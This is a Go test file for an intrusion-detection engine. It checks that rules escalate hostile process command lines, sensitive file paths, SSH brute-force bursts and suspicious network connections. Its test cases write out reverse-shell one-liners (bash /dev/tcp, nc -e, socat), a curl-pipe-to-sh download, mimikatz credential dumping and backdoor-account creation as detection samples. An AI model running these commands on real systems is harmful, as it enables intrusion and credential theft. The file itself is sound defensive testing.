package detect

import (
	"testing"
	"time"

	"elmer/internal/config"
	"elmer/internal/events"
)

func testConfig() *config.Config {
	c, err := config.Default()
	if err != nil {
		panic(err)
	}
	return c
}

func TestBuiltinRulesCompile(t *testing.T) {
	if _, err := NewEngine(testConfig()); err != nil {
		t.Fatalf("builtin rules failed to compile: %v", err)
	}
}

func procEvent(cmdline string) events.Event {
	return events.Event{
		Time: time.Now(), Severity: events.Info,
		Category: events.CatProcess, Title: "exec",
		Fields: map[string]string{"cmdline": cmdline},
	}
}

func TestProcessRules(t *testing.T) {
	e, err := NewEngine(testConfig())
	if err != nil {
		t.Fatal(err)
	}
	cases := []struct {
		name, cmdline string
		wantSev       events.Severity
		wantTitle     string
	}{
		{"reverse shell bash devtcp", "/bin/bash -i >& /dev/tcp/10.1.2.3/4444 0>&1", events.Critical, "Reverse shell"},
		{"netcat exec", "nc -e /bin/sh 10.0.0.5 4444", events.Critical, "Reverse shell"},
		{"ncat exec", "ncat 10.0.0.5 4444 -e /bin/bash", events.Critical, "Reverse shell"},
		{"socat exec", "socat tcp-connect:10.0.0.5:4444 exec:\"bash -li\",pty", events.Critical, "Reverse shell"},
		{"python pty", "python3 -c import pty;pty.spawn('/bin/bash')", events.Critical, "Reverse shell"},
		{"chisel", "/tmp/chisel client 10.0.0.5:8000 R:socks", events.Critical, "Chisel"},
		{"mimikatz", "mimikatz.exe sekurlsa::logonpasswords", events.Critical, "Mimikatz"},
		{"useradd", "/usr/sbin/useradd -m -s /bin/bash backdoor", events.Critical, "User account created"},
		{"chmod suid", "/bin/chmod 4755 /tmp/rootkit", events.High, "SUID"},
		{"chmod symbolic suid", "chmod u+s /tmp/rootkit", events.High, "SUID"},
		{"chmod normal", "chmod 644 notes.txt", events.Info, "exec"},
		{"curl pipe sh", "curl http://10.0.0.5/x.sh | sh", events.High, "Downloaded script"},
		{"nmap", "nmap -sS 10.10.0.0/16", events.Medium, "scanner"},
		{"history wipe", "sh -c history -c", events.Medium, "history"},
		{"benign ls", "/bin/ls -la /var/log", events.Info, "exec"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			ev := procEvent(tc.cmdline)
			out := e.Evaluate(ev)
			var got *events.Event
			for i := range out {
				if out[i].Category == events.CatProcess {
					got = &out[i]
				}
			}
			if tc.wantSev == events.Info {
				if got != nil && got.Severity != events.Info {
					t.Fatalf("expected no escalation, got %s (%s)", got.Severity, got.Title)
				}
				return
			}
			if got == nil {
				t.Fatalf("event dropped entirely (LogProcessEvents=false default in test)")
			}
			if got.Severity < tc.wantSev {
				t.Fatalf("severity %s < wanted %s (title %q)", got.Severity, tc.wantSev, got.Title)
			}
			if got.Title != tc.wantTitle && tc.wantTitle != "" && !containsFold(got.Title, tc.wantTitle) {
				t.Fatalf("title %q does not contain %q", got.Title, tc.wantTitle)
			}
		})
	}
}

func containsFold(hay, needle string) bool {
	h, n := len(hay), len(needle)
	for i := 0; i+n <= h; i++ {
		if equalFold(hay[i:i+n], needle) {
			return true
		}
	}
	return false
}

func equalFold(a, b string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := 0; i < len(a); i++ {
		ca, cb := a[i], b[i]
		if 'A' <= ca && ca <= 'Z' {
			ca += 32
		}
		if 'A' <= cb && cb <= 'Z' {
			cb += 32
		}
		if ca != cb {
			return false
		}
	}
	return true
}

func TestFileRules(t *testing.T) {
	e, _ := NewEngine(testConfig())
	for path, wantSev := range map[string]events.Severity{
		"/etc/shadow":                    events.Critical,
		"/root/.ssh/authorized_keys":     events.Critical,
		"/etc/ld.so.preload":             events.Critical,
		"/etc/cron.d/persistence":        events.High,
		"/usr/bin/sshd":                  events.High,
		"/tmp/chisel":                    events.High, // known bad filename
		"/opt/tools/linpeas.sh":          events.High,
		"/home/user/notes.txt":           events.Info,
	} {
		ev := events.Event{
			Time: time.Now(), Severity: events.Info, Category: events.CatFile,
			Title: "file changed", Fields: map[string]string{"path": path},
		}
		out := e.Evaluate(ev)
		if len(out) == 0 {
			t.Fatalf("%s: event dropped", path)
		}
		if out[0].Severity < wantSev {
			t.Fatalf("%s: severity %s < %s (title %q)", path, out[0].Severity, wantSev, out[0].Title)
		}
	}
}

func TestBruteForceThreshold(t *testing.T) {
	e, _ := NewEngine(testConfig())
	start := time.Now()
	var fired []events.Event
	for i := 0; i < 25; i++ {
		ev := events.Event{
			Time: start.Add(time.Duration(i) * time.Second),
			Severity: events.Info, Category: events.CatAuth,
			Title: "SSH auth failure", Message: "Failed password for root from 203.0.113.9",
			Fields: map[string]string{"auth": "fail", "src_ip": "203.0.113.9", "user": "root"},
		}
		fired = append(fired, e.Evaluate(ev)...)
	}
	var med, high int
	for _, f := range fired {
		if f.Title == "SSH brute force suspected" {
			med++
		}
		if f.Title == "SSH brute force in progress" {
			high++
		}
	}
	if med != 1 || high != 1 {
		t.Fatalf("brute force alerts: medium=%d high=%d, want 1/1", med, high)
	}
}

func TestCustomRule(t *testing.T) {
	cfg := testConfig()
	cfg.Rules = []config.RuleConfig{{
		ID: "gold", Pattern: `(?i)/tmp/.*flag`, Severity: "critical",
		Title: "Golden flag access", Target: "process",
	}}
	e, err := NewEngine(cfg)
	if err != nil {
		t.Fatal(err)
	}
	out := e.Evaluate(procEvent("cat /tmp/super_secret_flag.txt"))
	if len(out) == 0 || out[0].Severity != events.Critical || out[0].Title != "Golden flag access" {
		t.Fatalf("custom rule did not fire: %+v", out)
	}
}

func TestRootWorldWritable(t *testing.T) {
	e, _ := NewEngine(testConfig())
	ev := events.Event{
		Time: time.Now(), Severity: events.Info, Category: events.CatProcess,
		Title: "exec", Fields: map[string]string{
			"exe": "/dev/shm/.cache/worker", "uid": "0",
		},
	}
	out := e.Evaluate(ev)
	if len(out) == 0 || out[0].Severity < events.High {
		t.Fatalf("world-writable exec not escalated: %+v", out)
	}
}

func netEvent(action, ip, port, uid string) events.Event {
	return events.Event{
		Time: time.Now(), Severity: events.Info, Category: events.CatNetwork,
		Title: "outbound connect", Fields: map[string]string{
			"action": action, "dst_ip": ip, "port": port, "uid": uid, "pid": "1",
		},
	}
}

func TestClassifyNet(t *testing.T) {
	e, _ := NewEngine(testConfig())
	cases := []struct {
		name             string
		action, ip, port string
		wantSev          events.Severity
	}{
		{"connect suspicious port", "connect", "10.0.0.5", "4444", events.Critical},
		{"connect external as root", "connect", "203.0.113.9", "443", events.High},
		{"connect external as user", "connect", "198.51.100.7", "80", events.Medium},
		{"connect internal", "connect", "10.1.2.3", "80", events.Info},
		{"bind suspicious port", "bind", "0.0.0.0", "31337", events.High},
		{"bind normal port", "bind", "127.0.0.1", "5355", events.Info},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			uid := "1000"
			if tc.wantSev == events.High && tc.action == "connect" {
				uid = "0"
			}
			out := e.Evaluate(netEvent(tc.action, tc.ip, tc.port, uid))
			if len(out) == 0 {
				t.Fatalf("event dropped")
			}
			if out[0].Severity != tc.wantSev {
				t.Fatalf("severity %s, want %s (title %q)", out[0].Severity, tc.wantSev, out[0].Title)
			}
		})
	}
}
